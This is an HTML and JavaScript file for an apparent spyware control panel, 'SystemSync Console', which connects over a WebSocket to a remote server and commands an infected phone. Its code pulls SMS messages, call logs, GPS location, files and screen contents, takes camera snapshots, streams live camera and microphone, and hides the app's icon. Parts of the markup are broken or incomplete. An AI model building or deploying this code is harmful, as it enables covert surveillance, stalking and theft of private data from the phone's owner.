<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ===== GLOBAL ===== */
        body{
            margin:0;
            background:#f5f7fa;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            height:100vh;
            overflow:hidden;
        }

        /* ===== SIDEBAR ===== */
        #sidebar{
            width:280px;
            background:white;
            border-right:1px solid #e0e4e8;
            padding:20px;
            overflow-y:auto;
            box-shadow:2px 0 5px rgba(0,0,0,0.02);
        }

        .logo{
            font-size:20px;
            font-weight:600;
            color:#1976ff;
            margin-bottom:30px;
        }

        .section{
            margin-bottom:25px;
        }

        .section-title{
            font-size:12px;
            font-weight:600;
            color:#7b8a9b;
            text-transform:uppercase;
            letter-spacing:0.5px;
            margin-bottom:12px;
        }

        button{
            width:100%;
            padding:10px 12px;
            margin:4px 0;
            background:white;
            color:#1a2634;
            border:1px solid #d0d9e2;
            border-radius:8px;
            font-size:14px;
            text-align:left;
            cursor:pointer;
            transition:0.2s;
            display:flex;
            align-items:center;
            gap:8px;
        }

        button:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* camera control panels */
        .camera-panel {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            display: none;
        }
        .camera-panel.show {
            display: block;
        }
        .camera-option {
            margin: 8px 0;
        }
        .camera-option label {
            margin-right: 15px;
            color: #1a2634;
        }
        .capture-btn, .live-btn {
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }
        .capture-btn:hover, .live-btn:hover {
            background: #0d5bca;
        }

        /* live stream controls */
        .live-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .live-controls button {
            flex: 1;
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            width: auto;
        }
        .live-controls button.stop {
            background: #d32f2f;
        }
        .live-controls button.stop:hover {
            background: #b71c1c;
        }
        .live-controls button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* ===== MAIN PANEL ===== */
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
            min-width:0;
            background:#f5f7fa;
        }

        #header{
            height:60px;
            background:white;
            border-bottom:1px solid #e0e4e8;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            font-weight:600;
            color:#1a2634;
        }

        #status{
            padding:6px 16px;
            border-radius:30px;
            background:#e8f0fe;
            color:#1976ff;
            font-weight:500;
        }

        #content{
            flex:1;
            padding:20px;
            overflow:auto;
        }

        /* SINGLE CONTENT PANEL */
        #main-panel{
            background:white;
            border-radius:12px;
            box-shadow:0 2px 8px rgba(0,0,0,0.05);
            padding:20px;
            min-height:100%;
            position:relative;
        }

        /* ===== MAP ===== */
        #map{
            height:400px;
            border-radius:10px;
        }
        /* GPS overlay */
        .map-info {
            position: absolute;
            top: 30px;
            left: 30px;
            background: rgba(255,255,255,0.95);
            padding: 8px 12px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            font-size: 13px;
            color: #1a2634;
            z-index: 1000;
            pointer-events: none;
            border-left: 4px solid #1976ff;
        }
        .map-info div {
            margin: 2px 0;
        }
        .map-info .coord {
            font-weight: 600;
        }
        .map-info .addr {
            color: #2c3e50;
            font-style: italic;
        }

        /* ===== TABLES ===== */
        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }
        th{
            background:#f8fafd;
            color:#1a2634;
            font-weight:600;
            padding:12px 10px;
            text-align:left;
            border-bottom:2px solid #e0e4e8;
        }
        td{
            padding:10px;
            border-bottom:1px solid #eef2f5;
            color:#2c3e50;
            word-break:break-word;
        }
        tr:hover{
            background:#f5f9ff;
        }

        /* ===== FILE EXPLORER ===== */
        .file-manager {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: white;
            z-index: 10;
            padding-bottom: 10px;
            margin-bottom: 10px;
            border-bottom: 1px solid #eef2f5;
        }
        .file-toolbar {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .file-toolbar button{
            width:auto;
            padding:6px 12px;
            background:white;
            border:1px solid #d0d9e2;
            border-radius:6px;
            cursor:pointer;
            font-size:13px;
            margin:0;
        }
        .file-toolbar button:hover{
            background:#1976ff;
            color:white;
        }
        .file-path{
            background:#f0f2f5;
            padding:6px 12px;
            border-radius:20px;
            font-size:13px;
            color:#2c3e50;
            flex:1;
        }
        .file-panes {
            display: flex;
            gap: 20px;
            flex: 1;
            overflow: hidden;
            min-height: 300px;
        }
        .folder-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .file-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .pane-title {
            font-size: 12px;
            font-weight: 600;
            color: #7b8a9b;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .folder-item, .file-item {
            display: flex;
            align-items: center;
            padding: 6px 8px;
            border-radius: 6px;
            cursor: pointer;
            gap: 8px;
            margin-bottom: 2px;
        }
        .folder-item:hover {
            background: #e3f2fd;
        }
        .file-item {
            cursor: default;
        }
        .file-item:hover {
            background: #f5f5f5;
        }
        .folder-icon, .file-icon {
            width: 20px;
            text-align: center;
        }
        .folder-name, .file-name {
            flex: 1;
            font-size: 14px;
        }
        .folder-name {
            color: #1976ff;
        }
        .file-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            margin-right: 8px;
        }
        .file-size {
            color: #7b8a9b;
            font-size: 12px;
            margin-left: 10px;
        }
        .download-selected{
            margin-top:15px;
            text-align:right;
            position: sticky;
            bottom: 0;
            background: white;
            padding: 10px 0 0 0;
            border-top: 1px solid #eef2f5;
        }
        .download-selected button{
            width:auto;
            padding:8px 16px;
            background:#1976ff;
            color:white;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:500;
        }
        .download-selected button:hover{
            background:#0d5bca;
        }

        /* ===== PAGINATION ===== */
        .pagination{
            margin-top:20px;
            display:flex;
            gap:8px;
            justify-content:center;
        }
        .page-btn{
            padding:6px 12px;
            border:1px solid #d0d9e2;
            background:white;
            border-radius:6px;
            cursor:pointer;
            color:#1a2634;
        }
        .page-btn:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* ===== IMAGES & VIDEO ===== */
        img, video{
            max-width:100%;
            max-height:70vh;
            border-radius:8px;
            display:block;
            margin:0 auto;
        }

        /* ===== AUDIO PLAYER ===== */
        audio{
            width:100%;
            margin-top:15px;
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button onclick="toggleScreen()"><span>üñ•</span> <span id="screenBtn">Start Screen</span></button>

        <!-- Click Picture panel -->
        <button onclick="toggleCameraPanel('click')"><span>üì∑</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>

        <button onclick="toggleCameraPanel('live')"><span>üìπ</span> See Live</button>

                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label>
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>

        <!-- Live Audio button -->
        <button onclick="toggleLiveAudio()"><span>üé§</span> <span id="liveAudioBtn">Live Audio</span></button>

        <div class="section-title">Control</div>

</div>

<div id="main">
    <div id="header">
        <div>Control Panel</div>
        <div id="status">CONNECTING</div>
    </div>
    <div id="content">
        <div id="main-panel">
            Ready.
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- CONFIG ----------
    const WS_URL = "wss://mirror-view.onrender.com";

    // ---------- GLOBALS ----------
    let ws;
    let pc = null;                     // WebRTC peer for screen share
    let mapInstance = null;
    let currentData = [];               // for pagination
    let currentPage = 0;
    let dataType = null;                // 'sms', 'call', 'file'
    let currentPath = "root";           // current directory for file manager
    let selectedFiles = [];              // paths of selected files for download
    let downloadQueue = [];              // queue of paths for which we've sent 'dl' and await FILE_DATA

    // Live camera state
    let liveCamPC = null;
    let liveCamStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    // Live audio state
    let liveAudioPC = null;
    let liveAudioStream = null;
    let audioMediaRecorder = null;
    let audioRecordedChunks = [];

    // Toggle states
    let screenActive = false;
    let iconHidden = false;

    const panel = document.getElementById('main-panel');

    // ---------- CONNECTION (with dual message handling) ----------
    function connect() {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('Connected');
            ws.send("I_AM_WEB");
            setStatus("ONLINE");
        };
        ws.onmessage = (e) => {
            const msg = e.data;
            console.log('Received:', msg);

            // Try to parse as JSON first
            try {
                const json = JSON.parse(msg);
                handleJSON(json);
                return;
            } catch (err) {
                // Not JSON ‚Äì fallback to plain text
                handlePlainText(msg);
            }
        };
        ws.onclose = () => {
            setStatus('OFFLINE');
            setTimeout(connect, 5000);
        };
        ws.onerror = console.error;
    }

    // ---------- JSON HANDLER ----------
    function handleJSON(json) {
        console.log('handleJSON received:', json.type, json);
        switch (json.type) {
            case 'SMS_DATA':
                dataType = 'sms';
                currentData = json.data;
                renderTable();
                break;
            case 'CALL_LOGS':
                dataType = 'call';
                currentData = json.data;
                renderTable();
                break;
            case 'FILE_LIST':
                dataType = 'file';
                currentData = json.data;
                renderFiles();
                break;
            case 'LOCATION_UPDATE':
                renderMap(json.data);
                break;
            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                break;
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                break;
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                break;
            case 'DEVICE_STATUS':
                setStatus(json.status);
                break;
            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                break;
            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                break;
            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                break;
            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (pc) { pc.close(); pc = null; }
                showNotification('Screen share stopped');
                break;
            case 'OFFER':
                console.log('üì• Received WebRTC Screen OFFER');
                handleOffer(json.sdp);
                break;
            case 'CAMERA_OFFER':
                console.log('üì• Received CAMERA_OFFER');
                handleCameraOffer(json);
                break;
            case 'AUDIO_OFFER':
                console.log('üì• Received AUDIO_OFFER');
                handleAudioOffer(json);
                break;
            default:
                console.log('Unhandled JSON type:', json.type);
        }
    }

    // ---------- PLAIN TEXT HANDLER (legacy) ----------
    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
            } catch (err) {
                console.error(err);
            }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (pc) { pc.close(); pc = null; }
            showNotification('Screen share stopped');
        } else if (msg.startsWith("RTC_OFFER:screen:")) {
            handleOffer(msg.substring(17));
        } else if (msg.startsWith("ICE_CANDIDATE:")) {
            handleIceCandidate(msg.substring(14));
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            if (downloadQueue.length > 0) {
                const path = downloadQueue.shift();
                const filename = path.split('/').pop();
                downloadBase64(base64, filename);
            } else {
                downloadBase64(base64, 'downloaded_file');
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function setStatus(s) {
        const el = document.getElementById('status');
        el.innerText = s;
        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
    }

    // ---------- COMMAND ----------
    function send(cmd) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(cmd);
        } else {
            alert('Not connected');
        }
    }

    // ---------- SEND JSON COMMAND ----------
    function sendCommand(command, params = {}) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            alert('Not connected');
            return;
        }
        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
    }

    // ---------- TOGGLE CAMERA PANELS ----------
    function toggleCameraPanel(panelId) {
        const clickPanel = document.getElementById('clickCameraPanel');
        const livePanel = document.getElementById('liveCameraPanel');
        if (panelId === 'click') {
            clickPanel.classList.toggle('show');
            livePanel.classList.remove('show');
        } else {
            livePanel.classList.toggle('show');
            clickPanel.classList.remove('show');
        }
    }

    // ---------- CAPTURE PICTURE ----------
    function capturePicture() {
        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
        const useFlash = document.getElementById('clickFlashCheckbox').checked;
        sendCommand('CAMERA_SNAPSHOT', { camera: camera, flash: useFlash });
    }

    // ---------- DISPLAY CAPTURED IMAGE WITH SAVE BUTTON ----------
    function displayCapturedImage(base64) {
        panel.innerHTML = `
            <img src="data:image/jpeg;base64,${base64}">
            <div style="margin-top:10px;">
                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
            </div>
        `;
    }

    // ---------- LIVE STREAM (camera + mic) ----------
    function startLiveStream() {
        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
        const useFlash = document.getElementById('liveFlashCheckbox').checked;
        const useMic = document.getElementById('liveMicCheckbox').checked;
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            alert('Not connected');
            return;
        }

        panel.innerHTML = `
            <video id="liveCamVideo" autoplay playsinline></video>
            <div class="live-controls">
                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
                <button class="stop" onclick="stopLiveStream()">Stop</button>
            </div>
        `;

        liveCamPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        liveCamPC.ontrack = (e) => {
            console.log('Live cam ontrack', e.streams[0]);
            liveCamStream = e.streams[0];
            document.getElementById('liveCamVideo').srcObject = liveCamStream;
        };
        liveCamPC.onicecandidate = (e) => {
            if (e.candidate) {
                ws.send(JSON.stringify({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate.candidate,
                    sdpMid: e.candidate.sdpMid,
                    sdpMLineIndex: e.candidate.sdpMLineIndex
                }));
            }
        };
        liveCamPC.oniceconnectionstatechange = () => {
            console.log('Live cam ICE state:', liveCamPC.iceConnectionState);
        };

        sendCommand('START_CAMERA_STREAM', { camera: camera, flash: useFlash, mic: useMic });
    }

    function stopLiveStream() {
        if (liveCamPC) {
            liveCamPC.close();
            liveCamPC = null;
            liveCamStream = null;
        }
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
            mediaRecorder = null;
        }
        sendCommand('STOP_CAMERA_STREAM', {});
        panel.innerHTML = 'Ready.';
    }

    function handleCameraOffer(msg) {
        if (!liveCamPC) {
            console.error('No live camera peer connection');
            return;
        }
        const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
        liveCamPC.setRemoteDescription(offer)
            .then(() => liveCamPC.createAnswer())
            .then(answer => liveCamPC.setLocalDescription(answer))
            .then(() => {
                ws.send(JSON.stringify({
                    type: 'ANSWER',
                    requestId: msg.requestId,
                    sdp: liveCamPC.localDescription.sdp
                }));
            })
            .catch(e => console.error('Error handling camera offer:', e));
    }

    // ---------- LIVE AUDIO (mic only) ----------
    function toggleLiveAudio() {
        if (liveAudioPC) {
            stopLiveAudio();
        } else {
            startLiveAudio();
        }
    }

    function startLiveAudio() {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            alert('Not connected');
            return;
        }
        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
        liveAudioPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        liveAudioPC.ontrack = (e) => {
            console.log('Live audio ontrack', e.streams[0]);
            liveAudioStream = e.streams[0];
            const audioEl = document.getElementById('liveAudio');
            if (audioEl) {
                audioEl.srcObject = liveAudioStream;
                // Force play in case autoplay is blocked
                audioEl.play().catch(err => console.log('Autoplay prevented, user must click play', err));
            }
        };
        liveAudioPC.onicecandidate = (e) => {
            if (e.candidate) {
                ws.send(JSON.stringify({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate.candidate,
                    sdpMid: e.candidate.sdpMid,
                    sdpMLineIndex: e.candidate.sdpMLineIndex
                }));
            }
        };
        liveAudioPC.oniceconnectionstatechange = () => {
            console.log('Live audio ICE state:', liveAudioPC.iceConnectionState);
        };
        sendCommand('START_LIVE_AUDIO', { mic: true });
        document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
        document.getElementById('stopLiveAudioBtn').style.display = 'block';
    }

    function stopLiveAudio() {
        if (liveAudioPC) {
            liveAudioPC.close();
            liveAudioPC = null;
            liveAudioStream = null;
        }
        sendCommand('STOP_LIVE_AUDIO', {});
        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
        document.getElementById('stopLiveAudioBtn').style.display = 'none';
        panel.innerHTML = 'Ready.';
    }

    function handleAudioOffer(msg) {
        if (!liveAudioPC) {
            console.error('No live audio peer connection');
            return;
        }
        const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
        liveAudioPC.setRemoteDescription(offer)
            .then(() => liveAudioPC.createAnswer())
            .then(answer => liveAudioPC.setLocalDescription(answer))
            .then(() => {
                ws.send(JSON.stringify({
                    type: 'ANSWER',
                    requestId: msg.requestId,
                    sdp: liveAudioPC.localDescription.sdp
                }));
            })
            .catch(e => console.error('Error handling audio offer:', e));
    }

    // Snapshot from live video
    function takeSnapshot() {
        const video = document.getElementById('liveCamVideo');
        if (!video) {
            alert('No live video');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.png`;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/png');
    }

    // Recording for live video
    function toggleRecording() {
        if (!liveCamStream) {
            alert('No live stream');
            return;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            document.getElementById('recordBtn').innerText = 'Record Video';
        } else {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(liveCamStream);
            mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `recording_${Date.now()}.webm`;
                a.click();
                URL.revokeObjectURL(url);
            };
            mediaRecorder.start();
            document.getElementById('recordBtn').innerText = 'Stop Recording';
        }
    }

    // ---------- RENDERERS ----------

    function renderMap(loc) {
        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">üìç ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
            <div>üéØ Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
            <div>üì° Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">üåç Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `üåç ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = 'üåç Address unavailable';
        });
    }

    // Table render with pagination
    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        let headers = [], rows = [];
        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    // ---------- FILE EXPLORER (two‚Äëpane, with toolbar always visible) ----------
    function renderFiles() {
        let html = `
            <div class="file-manager">
                <div class="file-toolbar-sticky">
                    <div class="file-toolbar">
                        <button onclick="navigateUp()">‚¨Ü Up</button>
                        <span class="file-path">${currentPath}</span>
                    </div>
                </div>
        `;

        if (!currentData || currentData.length === 0) {
            html += '<p style="padding:20px;">No files found.</p>';
        } else {
            const folders = currentData.filter(item => item.isDir);
            const files = currentData.filter(item => !item.isDir);
            selectedFiles = [];

            html += `
                <div class="file-panes">
                    <div class="folder-pane">
                        <div class="pane-title">Folders</div>
                        <div id="folderList">
            `;

            folders.forEach(f => {
                html += `
                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
                        <span class="folder-icon">üìÅ</span>
                        <span class="folder-name">${f.name}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                    <div class="file-pane">
                        <div class="pane-title">Files</div>
                        <div id="fileList">
            `;

            files.forEach(f => {
                const path = f.path;
                const name = f.name;
                const size = formatBytes(f.size);
                html += `
                    <div class="file-item">
                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
                        <span class="file-icon">üìÑ</span>
                        <span class="file-name">${name}</span>
                        <span class="file-size">${size}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                </div>
                <div class="download-selected">
                    <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
                </div>
            `;
        }

        html += '</div>';
        panel.innerHTML = html;
    }

    window.handleFolderClick = function(path) {
        currentPath = path;
        send('ls ' + path);
    };

    function navigateUp() {
        if (currentPath === 'root' || currentPath === '') return;
        let parts = currentPath.split('/');
        parts.pop();
        let parent = parts.join('/');
        if (parent === '') parent = 'root';
        currentPath = parent;
        send('ls ' + parent);
    }

    window.updateSelected = function(checkbox) {
        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) {
                selectedFiles.push(path);
            }
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
        }
    };

    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;
        }
        selectedFiles.forEach(path => {
            downloadQueue.push(path);
            send('dl ' + path);
        });
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    // ---------- SCREEN SHARE WEBRTC ----------
    function handleOffer(sdp) {
        if (!pc) {
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.ontrack = (e) => {
                panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
                document.querySelector('video').srcObject = e.streams[0];
            };
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    ws.send(JSON.stringify({
                        type: "ICE_CANDIDATE",
                        candidate: e.candidate.candidate,
                        sdpMid: e.candidate.sdpMid,
                        sdpMLineIndex: e.candidate.sdpMLineIndex
                    }));
                }
            };
        }
        pc.setRemoteDescription({ type: 'offer', sdp })
            .then(() => pc.createAnswer())
            .then(a => pc.setLocalDescription(a))
            .then(() => {
                ws.send(JSON.stringify({
                    type: "ANSWER",
                    sdp: pc.localDescription.sdp
                }));
            })
            .catch(console.error);
    }

    function handleIceCandidate(candidateStr) {
        if (!pc) return;
        try {
            pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
        } catch (e) { console.error(e); }
    }

    function generateRequestId() {
        return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    }

    function showNotification(text) {
        const status = document.getElementById('status');
        const orig = status.innerText;
        status.innerText = text;
        setTimeout(() => { status.innerText = orig; }, 2000);
    }

    connect();
